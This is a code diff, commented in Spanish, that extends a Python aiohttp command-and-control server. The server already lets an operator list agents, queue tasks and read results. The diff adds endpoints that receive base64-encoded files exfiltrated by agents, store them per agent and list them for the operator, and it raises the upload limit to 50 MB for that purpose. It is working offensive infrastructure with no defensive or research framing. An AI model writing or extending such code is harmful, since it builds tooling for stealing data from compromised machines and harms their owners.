@@ -723,6 +723,56 @@ async def api_get_results(request: web.Request) -> web.Response:
     return web.json_response(results[agent_id])
 
 
+async def api_exfil_receive(request: web.Request) -> web.Response:
+    """POST /exfil — agente sube un archivo al servidor C2."""
+    try:
+        body = await request.json()
+    except Exception:
+        return web.json_response({"error": "invalid JSON"}, status=400)
+
+    agent_id = body.get("agent_id", "unknown")
+    raw_name  = os.path.basename(body.get("filename", "file"))
+    filename  = raw_name.lstrip(".") or "file"   # evita path traversal con ".." o ".hidden"
+    data_b64  = body.get("data", "")
+
+    if not filename or not data_b64:
+        return web.json_response({"error": "filename and data required"}, status=400)
+
+    try:
+        data = base64.b64decode(data_b64)
+    except Exception:
+        return web.json_response({"error": "invalid base64"}, status=400)
+
+    dest_dir = os.path.join("exfil_files", agent_id[:8])
+    os.makedirs(dest_dir, exist_ok=True)
+    dest_path = os.path.join(dest_dir, filename)
+    with open(dest_path, "wb") as f:
+        f.write(data)
+
+    log.info("EXFIL agent_id=%.8s file=%s size=%d", agent_id, filename, len(data))
+    return web.json_response({"status": "ok", "saved": dest_path, "size": len(data)})
+
+
+async def api_exfil_list(request: web.Request) -> web.Response:
+    """GET /exfil — operador lista los archivos exfiltrados."""
+    files = []
+    root = "exfil_files"
+    if os.path.isdir(root):
+        for agent_dir in sorted(os.listdir(root)):
+            agent_path = os.path.join(root, agent_dir)
+            if not os.path.isdir(agent_path):
+                continue
+            for fname in sorted(os.listdir(agent_path)):
+                fpath = os.path.join(agent_path, fname)
+                files.append({
+                    "agent_id": agent_dir,
+                    "filename": fname,
+                    "size": os.path.getsize(fpath),
+                    "path": fpath,
+                })
+    return web.json_response(files)
+
+
 async def handle_panel(request: web.Request) -> web.Response:
     return web.Response(text=_PANEL_HTML, content_type="text/html")
 
@@ -992,7 +1042,7 @@ async def _on_startup(app: web.Application) -> None:
 def build_app() -> web.Application:
     app = web.Application(
         middlewares=[_operator_auth],
-        client_max_size=1 * 1024 * 1024,  # 1 MB max request body
+        client_max_size=50 * 1024 * 1024,  # 50 MB (exfil de archivos)
     )
     app.router.add_get("/",                           handle_panel)
     app.router.add_post("/",                         handle_nexus)
@@ -1000,5 +1050,7 @@ def build_app() -> web.Application:
     app.router.add_get("/agents",                    api_list_agents)
     app.router.add_post("/agents/{agent_id}/task",   api_enqueue_task)
     app.router.add_get("/agents/{agent_id}/results", api_get_results)
+    app.router.add_post("/exfil",                    api_exfil_receive)
+    app.router.add_get("/exfil",                     api_exfil_list)
     app.on_startup.append(_on_startup)
     return app
